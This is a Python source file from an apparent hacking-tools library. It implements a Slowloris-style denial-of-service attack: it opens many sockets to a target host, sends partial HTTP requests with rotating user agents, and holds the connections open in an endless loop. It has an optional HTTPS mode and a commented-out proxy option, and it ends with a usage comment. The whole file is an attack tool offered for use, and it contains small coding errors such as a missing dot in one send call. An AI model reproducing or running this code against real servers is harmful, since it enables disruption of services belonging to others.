import random
import socket
import ssl
import time
from thglibs.auxiliares.cores.conf_colors import *


class DOS:
    def __init__(self, HOST, PORT, SOCKETS, VERBOSE, RANDUSERAGENTS, USEPROXY, PROXY_HOST, PROXY_PORT, HTTPS):
        if HOST == "":
            self.HOST = str(input("[+] DIGITE O HOST: "))

        if SOCKETS == "":
            self.SOCKETS = 150

        if PROXY_HOST == "":
            self.PROXY_HOST = "127.0.0.1"

        if PROXY_PORT == "":
            self.PROXY_PORT = 8080

        self.HOST = HOST
        self.PORT = PORT
        self.SOCKETS = SOCKETS
        self.VERBOSE = VERBOSE
        self.RANDUSERAGENTS = RANDUSERAGENTS
        self.USEPROXY = USEPROXY
        self.PROXY_HOST = PROXY_HOST
        self.PROXY_PORT = PROXY_PORT
        self.HTTPS = HTTPS

    # print(USEPROXY)

    yes = ["yes", "Yes", "YES", "y", "Y", "sim", "Sim", "SIM", "s", "s"]
    no = []

    # if USEPROXY in yes:
    #   import socks

    #  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, PROXY_HOST, PROXY_PORT)
    # socket.socket = socks.socksocket

    def init_socket(HOST, PORT, SOCKETS, VERBOSE, RANDUSERAGENTS, USEPROXY, PROXY_HOST, PROXY_PORT, HTTPS):
        yes = ["yes", "Yes", "YES", "y", "Y", "sim", "Sim", "SIM", "s", "s"]
        no = []

        list_of_sockets = []

        user_agents = [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
        ]

        socketfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socketfd.settimeout(4)

        if HTTPS in yes:
            socketfd = ssl.wrap_socket(socketfd)

        socketfd.connect((HOST, int(PORT)))
        socketfd.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))

        if RANDUSERAGENTS in yes:
            socketfd.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))

        else:
            socketfd.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
            socketfd.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))

        print("return")

        return (socketfd)

    def run(HOST, PORT, SOCKETS, VERBOSE, RANDUSERAGENTS, USEPROXY, PROXY_HOST, PROXY_PORT, HTTPS):
        list_of_sockets = []
        for _ in range(int(SOCKETS)):
            try:
                socketfd = DOS.init_socket(HOST, PORT, SOCKETS, VERBOSE, RANDUSERAGENTS, USEPROXY, PROXY_HOST,
                                           PROXY_PORT, HTTPS)

            except socket.error:
                break

            list_of_sockets.append(socketfd)

        while True:
            for socketfd in list(list_of_sockets):
                try:
                    socketfdsend("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                except socket.error:
                    list_of_sockets.remove(socketfd)

            for _ in range(int(SOCKETS) - len(list_of_sockets)):
                try:
                    socketfd = DOS.init_socket(HOST, PORT, SOCKETS, VERBOSE, RANDUSERAGENTS, USEPROXY, PROXY_HOST,
                                               PROXY_PORT, HTTPS)

                    if socketfd:
                        list_of_sockets.append(socketfd)

                except socket.error:
                    break

            print(f"Sending data for {HOST}")

            time.sleep(0)

# USAGE METHOD
# DOS.run(HOST, PORT, SOCKETS, VERBOSE, RANDUSERAGENTS, USEPROXY, PROXY_HOST, PROXY_PORT, HTTPS):
